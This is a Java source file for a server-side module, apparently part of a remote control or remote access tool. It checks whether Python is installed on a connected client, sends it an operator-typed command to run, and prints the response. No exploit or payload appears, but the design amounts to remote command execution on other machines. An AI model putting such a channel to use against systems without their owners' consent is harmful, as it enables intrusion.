package me.kutuzov.server.python.pmodule.modules;

import me.kutuzov.packet.python.CSPythonCommandPacket;
import me.kutuzov.packet.python.CSPythonStatusPacket;
import me.kutuzov.packet.python.SCPythonCommandPacket;
import me.kutuzov.packet.python.SCPythonStatusPacket;
import me.kutuzov.packet.python.status.InstalledStatus;
import me.kutuzov.server.client.Client;
import me.kutuzov.server.python.pmodule.PythonModule;

import java.util.concurrent.atomic.AtomicReference;

import static me.kutuzov.server.util.ConsoleUtils.*;

public class PyModCommand implements PythonModule<String> {
    @Override
    public String run(Client client) {
        AtomicReference<String> ret = new AtomicReference<>("");
        client.addWait(() -> {
            try {
                client.sendPacket(new SCPythonStatusPacket());

                CSPythonStatusPacket status = (CSPythonStatusPacket) client.readPacket();
                if(status.installed == InstalledStatus.UNKNOWN) {
                    ret.set("Python is not installed");
                    return;
                }

                pnl("Command: " + status.path);
                client.sendPacket(new SCPythonCommandPacket(status.path, readLine()));

                clearConsole();

                CSPythonCommandPacket packet = (CSPythonCommandPacket) client.readPacket();
                ret.set(packet.response);

                pnl("Response: " + packet.response);
            } catch (Exception exception) {
                exception.printStackTrace();
            }
        });

        pnl("Press any key to continue...");
        readLine();
        return ret.get();
    }
}